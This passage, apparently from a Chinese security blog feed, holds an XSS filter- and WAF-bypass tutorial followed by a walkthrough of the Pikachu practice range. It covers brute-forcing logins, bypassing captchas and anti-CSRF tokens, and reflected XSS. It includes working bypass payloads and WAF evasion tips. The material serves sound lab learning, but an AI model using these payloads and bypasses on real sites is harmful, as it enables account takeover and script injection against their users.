class="line">&#125;</span><br></pre></td></tr></table></figure><p>js 标签，src 的地址，随便，但是 js 的语法是大小写敏感的</p><p>开启 phpstudy，在目录下创建一个<code>ABC.JS</code>，写上一条<code>alert(1);</code>语句，保存</p><p>payload：<code>&lt;script src=&quot;http://127.0.0.1/ABC.JS&quot;&gt;&lt;/script&gt;</code></p><h2 id="13、使用-JS-的注释符"><a href="#13、使用-JS-的注释符" class="headerlink" title="13、使用 JS 的注释符"></a>13、使用 JS 的注释符</h2><h3 id="（1）注释符-–-gt"><a href="#（1）注释符-–-gt" class="headerlink" title="（1）注释符 –&gt;"></a>（1）注释符 –&gt;</h3><p><code>--&gt;</code> js 的注释符，让后面的语句不生效</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line"> input = input.replace(/[&lt;/&quot;&#x27;]/g, &#x27;&#x27;) //过滤了&lt; / &quot; &#x27;</span><br><span class="line"> return `</span><br><span class="line"> &lt;script&gt;</span><br><span class="line"> // alert(&#x27;$&#123;input&#125;&#x27;)    注释只能注释掉这一行</span><br><span class="line"> &lt;/script&gt;</span><br><span class="line"> `</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xx</span><br><span class="line">alert(1)</span><br><span class="line">--&gt;     js的注释符，让后面的语句不生效</span><br></pre></td></tr></table></figure><h3 id="（2）注释符-x2F-x2F"><a href="#（2）注释符-x2F-x2F" class="headerlink" title="（2）注释符 &#x2F;&#x2F;"></a>（2）注释符 &#x2F;&#x2F;</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// from alf.nu</span><br><span class="line">function render (s) &#123;</span><br><span class="line">  function escapeJs (s) &#123;</span><br><span class="line">    return String(s)</span><br><span class="line">            .replace(/\\/g, &#x27;\\\\&#x27;)</span><br><span class="line">            .replace(/&#x27;/g, &#x27;\\\&#x27;&#x27;)</span><br><span class="line">            .replace(/&quot;/g, &#x27;\\&quot;&#x27;)</span><br><span class="line">            .replace(/`/g, &#x27;\\`&#x27;)</span><br><span class="line">            .replace(/&lt;/g, &#x27;\\74&#x27;)</span><br><span class="line">            .replace(/&gt;/g, &#x27;\\76&#x27;)</span><br><span class="line">            .replace(/\//g, &#x27;\\/&#x27;)</span><br><span class="line">            .replace(/\n/g, &#x27;\\n&#x27;)</span><br><span class="line">            .replace(/\r/g, &#x27;\\r&#x27;)</span><br><span class="line">            .replace(/\t/g, &#x27;\\t&#x27;)</span><br><span class="line">            .replace(/\f/g, &#x27;\\f&#x27;)</span><br><span class="line">            .replace(/\v/g, &#x27;\\v&#x27;)</span><br><span class="line">            // .replace(/\b/g, &#x27;\\b&#x27;)</span><br><span class="line">            .replace(/\0/g, &#x27;\\0&#x27;)</span><br><span class="line">  &#125;</span><br><span class="line">  s = escapeJs(s)</span><br><span class="line">  return `</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  var url = &#x27;javascript:console.log(&quot;$&#123;s&#125;&quot;)&#x27;</span><br><span class="line">  var a = document.createElement(&#x27;a&#x27;)</span><br><span class="line">  a.href = url</span><br><span class="line">  document.body.appendChild(a)</span><br><span class="line">  a.click()</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：<code>&quot;);alert(1)//</code></p><p>通过源码发现一些字符被转义了，就连换行符也被转义了。但是发现竟然还可以用，原因是 &#x2F;&#x2F; 虽然被转义成了 &#x2F;&#x2F;，但转义之后还是 &#x2F;&#x2F;，在 js 中还是注释符（勿与正则混淆）</p><h2 id="14、使用古英语"><a href="#14、使用古英语" class="headerlink" title="14、使用古英语"></a>14、使用古英语</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line"> input = input.replace(/&lt;([a-zA-Z])/g, &#x27;&lt;_$1&#x27;) &lt;碰到字母就变成&lt;_</span><br><span class="line"> input = input.toUpperCase()</span><br><span class="line"> return &#x27;&lt;h1&gt;&#x27; + input + &#x27;&lt;/h1&gt;&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用维基百科搜索 s，会发现长 s，古英语的 s</p><p>举一反三，碰到其他字母是否也可以用古英语</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ſcript src=&#x27;http://127.0.0.1/ABC.JS&#x27;&gt;&lt;/script&gt;&lt;/pre&gt;</span><br></pre></td></tr></table></figure><h2 id="15、使用伪协议"><a href="#15、使用伪协议" class="headerlink" title="15、使用伪协议"></a>15、使用伪协议</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure><h1 id="三、Waf-防护与绕过演示"><a href="#三、Waf-防护与绕过演示" class="headerlink" title="三、Waf 防护与绕过演示"></a>三、Waf 防护与绕过演示</h1><p>就使用 xss-labs 这个靶场的第一关和某狗作为演示</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-e6aaf8a07400e9b2.png"></p><p>分析拦截情况</p><ol><li>通过去除关键词或关键词的其中某些字母判断拦截了什么关键词，如下正常</li></ol><p><img src="http://upload-images.jianshu.io/upload_images/27650211-18b631079fa7d76f.png"></p><ol start="2"><li>而如下就不正常了</li></ol><p><img src="http://upload-images.jianshu.io/upload_images/27650211-634df3384095219c.png"></p><ol start="3"><li>如下正常。说明是匹配了<code>&lt;script&gt;</code>标签</li></ol><p><img src="http://upload-images.jianshu.io/upload_images/27650211-4b37395ce934618c.png"></p><ol start="4"><li>尝试大小写绕过不行后，利用 XSS 平台，发现后面<code>&lt;/h2&gt;</code>的<code>&gt;</code>把前面的给包起来了，导致访问的链接拼接了<code>&lt;/h2</code></li></ol><p><img src="http://upload-images.jianshu.io/upload_images/27650211-25e75e6055c19d3f.png"></p><ol start="5"><li>使用引号包裹链接即可</li></ol><p><img src="http://upload-images.jianshu.io/upload_images/27650211-17e1069bfd8d0ddb.png"></p><ol start="6"><li>使用超链接也可以，但是<code>&lt;a href=xxx&gt;</code>猜测也就会检测 href，而事实也确实如此，只需要在 href 前加 &#x2F; 即可绕过，也不影响语义，而之所以加 &#x2F; 能绕过，是因为在前端中 &#x2F; 经常出现在 </xxxx> 闭合的后标签，加上后就会让 waf 误以为是结束标签</li></ol><p><img src="http://upload-images.jianshu.io/upload_images/27650211-9fb013bb29342ccd.png"></p><h1 id="四、常规-Waf-绕过思路"><a href="#四、常规-Waf-绕过思路" class="headerlink" title="四、常规 Waf 绕过思路"></a>四、常规 Waf 绕过思路</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[+] 标签语法替换</span><br><span class="line">[+] 特殊符号干扰    比如 / #</span><br><span class="line">[+] 提交方式更改    Request的前提下，Waf只检查URL内容而不检查POST内容</span><br><span class="line">[+] 垃圾数据溢出    </span><br><span class="line">[+] 加密解密算法</span><br><span class="line">[+] 结合其他漏洞绕过</span><br></pre></td></tr></table></figure><h1 id="五、XSS-自动化工具"><a href="#五、XSS-自动化工具" class="headerlink" title="五、XSS 自动化工具"></a>五、XSS 自动化工具</h1><h2 id="1、Xwaf"><a href="#1、Xwaf" class="headerlink" title="1、Xwaf"></a>1、Xwaf</h2><p>下载链接：<a href="https://links.jianshu.com/go?to=https://github.com/3xp10it/xwaf">https://github.com/3xp10it/xwaf</a></p><p>现在作者貌似不再维护该项目了</p><h2 id="2、XSStrike"><a href="#2、XSStrike" class="headerlink" title="2、XSStrike"></a>2、XSStrike</h2><p>下载链接：<a href="https://links.jianshu.com/go?to=https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">XSStrike 主要特点：</span><br><span class="line">[+] 反射和 DOM XSS 扫描</span><br><span class="line">[+] 多线程爬虫</span><br><span class="line">[+] Context 分析</span><br><span class="line">[+] 可配置的核心</span><br><span class="line">[+] 检测和规避 WAF</span><br><span class="line">[+] 老旧的 JS 库扫描</span><br><span class="line">[+] 智能 payload 生成器</span><br><span class="line">[+] 手工制作的 HTML &amp; JavaScript 解析器</span><br><span class="line">[+] 强大的 fuzzing 引擎</span><br><span class="line">[+] 盲打 XSS 支持</span><br><span class="line">[+] 高效的工作流</span><br><span class="line">[+] 完整的 HTTP 支持</span><br><span class="line">[+] Bruteforce payloads 支持</span><br><span class="line">[+] Payload 编码</span><br></pre></td></tr></table></figure><p>相关参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">-h, --help //显示帮助信息</span><br><span class="line">-u, --url //指定目标 URL</span><br><span class="line">--data //POST 方式提交内容</span><br><span class="line">-v, --verbose //详细输出</span><br><span class="line">-f, --file //加载自定义 paload 字典</span><br><span class="line">-t, --threads //定义线程数</span><br><span class="line">-l, --level //爬行深度</span><br><span class="line">-t, --encode //定义 payload 编码方式</span><br><span class="line">--json //将 POST 数据视为 JSON</span><br><span class="line">--path //测试 URL 路径组件</span><br><span class="line">--seeds //从文件中测试、抓取 URL</span><br><span class="line">--fuzzer //测试过滤器和 Web 应用程序防火墙。</span><br><span class="line">--update //更新</span><br><span class="line">--timeout //设置超时时间</span><br><span class="line">--params //指定参数</span><br><span class="line">--crawl //爬行</span><br><span class="line">--proxy //使用代理</span><br><span class="line">--blind //盲测试</span><br><span class="line">--skip //跳过确认提示</span><br><span class="line">--skip-dom //跳过 DOM 扫描</span><br><span class="line">--headers //提供 HTTP 标头</span><br><span class="line">-d, --delay //设置延迟</span><br></pre></td></tr></table></figure><h1 id="六、Fuzzing-测试"><a href="#六、Fuzzing-测试" class="headerlink" title="六、Fuzzing 测试"></a>六、Fuzzing 测试</h1><ul><li><p>在线生成 Fuzzing 字典：<a href="https://links.jianshu.com/go?to=https://xssfuzzer.com/fuzzer.html">XSS Fuzzer</a></p></li><li><p>Fuzzing 字典：<a href="https://links.jianshu.com/go?to=https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a></p></li></ul><h1 id="七、XSS（带过滤）靶场实战"><a href="#七、XSS（带过滤）靶场实战" class="headerlink" title="七、XSS（带过滤）靶场实战"></a>七、XSS（带过滤）靶场实战</h1><ul><li><p>Xss-labs：<a href="https://links.jianshu.com/go?to=https://www.yuque.com/docs/share/ad406668-69f3-4ac4-bde4-ec2ef0f2ae9f?%23">https://www.yuque.com/docs/share/ad406668-69f3-4ac4-bde4-ec2ef0f2ae9f?#</a></p></li><li><p>Xss 靶场通关：<a href="https://links.jianshu.com/go?to=https://www.yuque.com/docs/share/e0fb2c24-dbef-4174-8d44-eb6f4a164246?%23">https://www.yuque.com/docs/share/e0fb2c24-dbef-4174-8d44-eb6f4a164246?#</a></p></li><li><p>Java Xss 测试平台：<a href="https://links.jianshu.com/go?to=https://gitee.com/yhtmxl/imxss/">https://gitee.com/yhtmxl/imxss/</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pikachu通关记录</title>
      <link href="/2023/04/21/%E5%AE%89%E5%85%A8/pikachu%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/04/21/%E5%AE%89%E5%85%A8/pikachu%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><h2 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h2><p><img src="https://img-blog.csdnimg.cn/432db136cabf4e8e95cdf7ef89678133.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_13,color_FFFFFF,t_70,g_se,x_16"></p><p>看到登录表单，先随便输入用 <a href="https://so.csdn.net/so/search?q=Burpsuite&spm=1001.2101.3001.7020">Burpsuite</a> 抓包试试</p><p><img src="https://img-blog.csdnimg.cn/6775188f75b84f82874314c7e74f20d9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>看到数据包中账号密码</p><p>试试进行暴力破解</p><p>把数据包大送到 intruder 模块，选择 Cluster <a href="https://so.csdn.net/so/search?q=bomb&spm=1001.2101.3001.7020">bomb</a></p><p><img src="https://img-blog.csdnimg.cn/6dd7770e0c6a463fab782f63ec74bd15.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>分别选择账号和密码的爆破字典</p><p><img src="https://img-blog.csdnimg.cn/7f28ef82aa904d8881359b3d833922cb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_16,color_FFFFFF,t_70,g_se,x_16"></p><p><img src="https://img-blog.csdnimg.cn/14a5c4f45c004f1d89f561c6e2c31308.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_17,color_FFFFFF,t_70,g_se,x_16"></p><p>开始爆破</p><p>发现账号 admin 密码 123456 返回长度和其它都不一样</p><p><img src="https://img-blog.csdnimg.cn/1ebc3876da964045a3685dcd171e1db9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>试着登录，登录成功</p><p><img src="https://img-blog.csdnimg.cn/b183eb9589a945e487c2bb859f092d77.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_10,color_FFFFFF,t_70,g_se,x_16"></p><h2 id="验证码绕过（on-server"><a href="#验证码绕过（on-server" class="headerlink" title="验证码绕过（on server)"></a>验证码绕过（on server)</h2><p><img src="https://img-blog.csdnimg.cn/c871adeee18944a08c9be0f01c6a404f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_12,color_FFFFFF,t_70,g_se,x_16"></p><p>还是先<a href="https://so.csdn.net/so/search?q=%E6%8A%93%E5%8C%85&spm=1001.2101.3001.7020">抓包</a></p><p><img src="https://img-blog.csdnimg.cn/34979ac685d34374af4364997e677d01.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>先发送到 repeater，看一下回显</p><p>验证码不正确会显示验证码不正确</p><p><img src="https://img-blog.csdnimg.cn/3a289d52c1e7443daf67ec860aef73f6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>当把验证码去掉后显示验证码不能为空，证明是后端验证</p><p><img src="https://img-blog.csdnimg.cn/6d2c61edd8764c9fb39c3e67b6087260.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>当输入正确验证码，不正确账号密码时，会显示账号或密码不存在</p><p><img src="https://img-blog.csdnimg.cn/ffcf2ff36f974aab850af695f700295b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>再次换账号密码提交发现，验证码还可用</p><p><img src="https://img-blog.csdnimg.cn/6eb7f51cba6b4d06885ad85a2c091d55.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>得知验证码不具有有效期，只要不更换图片都一直可用</p><p>直接固定验证码进行暴力破解账号和密码</p><p>发送到 intruder 模块</p><p><img src="https://img-blog.csdnimg.cn/a5e5668751b2420eaad850d99d39c137.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>选择字典后进行爆破</p><p><img src="https://img-blog.csdnimg.cn/cab4b2f644a149229ed011442d176cc8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>破解成功</p><h2 id="验证码绕过（on-client"><a href="#验证码绕过（on-client" class="headerlink" title="验证码绕过（on client)"></a>验证码绕过（on client)</h2><p><img src="https://img-blog.csdnimg.cn/36770770cb9344fa875161174eb7fe8c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_13,color_FFFFFF,t_70,g_se,x_16"></p><p>还是输入抓包</p><p><img src="https://img-blog.csdnimg.cn/605a7ca549204fdeaf3f9873ad217bdb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>发现弹窗显示验证码错误，没有发送数据包，证明是前端验证</p><p>输入正确验证码进行抓包</p><p><img src="https://img-blog.csdnimg.cn/78ed53505f8345ebb8c6aeb41ddb26ef.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>成功抓包</p><p>发送到 repeater 模块看看回显</p><p><img src="https://img-blog.csdnimg.cn/4798a0f6d59047ad9cbe5215a4dd38ae.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>发现每次提交之后验证码就换了，但是不影响我们提交，因为是前端验证，抓包已经绕过</p><p>发送到 intruder 模块暴力破解</p><p><img src="https://img-blog.csdnimg.cn/acb2b885497d435cb17082a406a77819.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>破解成功</p><h2 id="token-防爆破？"><a href="#token-防爆破？" class="headerlink" title="token 防爆破？"></a>token 防爆破？</h2><p><img src="https://img-blog.csdnimg.cn/011264fc8dff42619833bf8ef64772e3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_12,color_FFFFFF,t_70,g_se,x_16"></p><p>还是先抓包</p><p><img src="https://img-blog.csdnimg.cn/d5e84fb620224f90b2454adc03d8422a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>发送到 repeater 模块看回显</p><p><img src="https://img-blog.csdnimg.cn/698ff8d2766a4f12b7b5d7f618c1b8d4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>改一下 token 再看回显</p><p><img src="https://img-blog.csdnimg.cn/d6e5cd3d405048b196e1fb7b13aa253b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>发现 token 不正确，数据包无效</p><p>再次提交看回显</p><p><img src="https://img-blog.csdnimg.cn/093f02b6ded14029a55a58aeadae052d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>发现再次提交 token 已经无效，每次提交都会更换 token</p><p>页面检查发现一个 hidden 属性的 input，里面记录着 token</p><p><img src="https://img-blog.csdnimg.cn/c24254579ba845b990d7e69b3ca321c0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>发现 token 值发送到了前端中，可以被获取</p><p>将数据包发送到 intruder 模块进行爆破</p><p><img src="https://img-blog.csdnimg.cn/bd22163c20604c38a3e3a1e7d0f94931.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>选择 pitchfork 类型</p><p>将用户名，密码，token 都设置为变量</p><p>找到 options 中的 Grep-Extract 模块</p><p><img src="https://img-blog.csdnimg.cn/822c7dca48624d1babad08ec2f77b21d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_18,color_FFFFFF,t_70,g_se,x_16"></p><p>点击添加 add，找到 token 值</p><p><img src="https://img-blog.csdnimg.cn/6082e410d73b4b3fb2bcff02628b050e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>在 options 中找到 Redirections 选择 Always</p><p><img src="https://img-blog.csdnimg.cn/97a7f52251c1485582251153c57fed42.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_19,color_FFFFFF,t_70,g_se,x_16"></p><p>设置线程为 1</p><p><img src="https://img-blog.csdnimg.cn/26e9524b87f3460d8016d91c8b599828.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_18,color_FFFFFF,t_70,g_se,x_16"></p><p>然后第一个参数和第二个参数分别导入账号和密码的字典</p><p>第三个参数选择 Recursive grep, 选择刚才筛选的 Recursive grep，然后填入抓包时的 token</p><p><img src="https://img-blog.csdnimg.cn/1ff73d5c6c13499398a7d71c482c76cb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>开始爆破</p><p><img src="https://img-blog.csdnimg.cn/9fd91b23ff9f4e2495d343db5b4eaf7c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>爆破成功</p><h1 id="Cross-Site-Scripting"><a href="#Cross-Site-Scripting" class="headerlink" title="Cross-Site Scripting"></a>Cross-Site Scripting</h1><h2 id="反射型-XSS（get）"><a href="#反射型-XSS（get）" class="headerlink" title="反射型 XSS（get）"></a>反射型 XSS（get）</h2><p><img src="https://img-blog.csdnimg.cn/56f44358b0de48bf8d830c1b0c3cc4f5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_13,color_FFFFFF,t_70,g_se,x_16"></p><p>先随便输入看看回显</p><p><img src="https://img-blog.csdnimg.cn/9c088b7b238542e9bc265fabcb471a60.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_10,color_FFFFFF,t_70,g_se,x_16"></p><p><img src="https://img-blog.csdnimg.cn/e2fe80aef5454616a41ad7bfa54386f5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_9,color_FFFFFF,t_70,g_se,x_16"></p><p>查看源代码发现我们输入的直接输出到</p><p>标签中</p><p><img src="https://img-blog.csdnimg.cn/c59bdd0b1bbb466e8092500c1fc0210e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_14,color_FFFFFF,t_70,g_se,x_16"></p><p><img src="https://img-blog.csdnimg.cn/1cbf48c0ee7e4073990b93203944cbae.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_18,color_FFFFFF,t_70,g_se,x_16"></p><p>输入弹窗代码看是否存在 xss</p><p><img src="https://img-blog.csdnimg.cn/c3025032774949a89824204f3c636940.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_11,color_FFFFFF,t_70,g_se,x_16"></p><p>发现输入框限制长度，修改前端代码修改限制长度</p><p><img src="https://img-blog.csdnimg.cn/9f4e92df89184393917b168a4e50b5a5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>也可以直接修改 url 中参数</p><p><img src="https://img-blog.csdnimg.cn/6a1bb41b9f6f4b0b8eec886ea2b9012f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_9,color_FFFFFF,t_70,g_se,x_16"></p><p><img src="https://img-blog.csdnimg.cn/751fc61ae9904317b8391a43eeb8f0c6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h2 id="反射型-XSS（post）"><a href="#反射型-XSS（post）" class="headerlink" title="反射型 XSS（post）"></a>反射型 XSS（post）</h2><p><img 